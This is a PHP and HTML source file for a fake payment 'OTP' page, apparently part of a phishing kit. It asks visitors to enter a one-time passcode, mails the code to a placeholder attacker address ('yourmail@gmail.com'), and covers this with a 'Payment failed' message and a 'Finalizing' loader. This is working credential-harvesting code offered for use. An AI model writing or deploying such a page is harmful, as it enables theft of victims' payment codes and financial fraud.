<?php
    $mail_err = '';
    if (isset($_POST['btn'])) {
        
        $msg  = "OTP : " . $_POST['otp'] . "<hr>";

        $msg = wordwrap($msg,70);
        
        $mail = mail("yourmail@gmail.com", "Your subject here", $msg);

        if ($mail) {
            header('Location:index.php');
        } else {
            $mail_err = 'Payment failed. Please try again';
        }
    }
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.4.2/css/all.css">
    <link rel="stylesheet" href="style.css">
    <title>OTP</title>
</head>
<body>
    <div class="wrapper">
        <div class="payment">
            <div class="payment-logo">
                <p>p</p>
            </div>
            <h2>OTP</h2>
            <h3 style="color: red;text-align: center; margin-bottom: 10px;"><?php echo $mail_err; ?></h3>
            <form method="POST" id="form" class="form">
                <div class="form-control">
                    <label for="otp">Enter OTP:</label>
                    <input type="number" name="otp" placeholder="Enter Recieved OTP" id="otp" />
                    <i class="fas fa-check-circle"></i>
                    <i class="fas fa-exclamation-circle"></i>
                    <small>Error message</small>
                </div>
                <button> Submit </button>
                <div class='processing_form'>
                    <div class="content">
                        <div class="loader"></div>
                        <p>Finalizing, Please Wait....</p>
                    </div>
                </div>
            </form>
        </div>
    </div>
    <script src="otp.js"></script>
</body>
</html>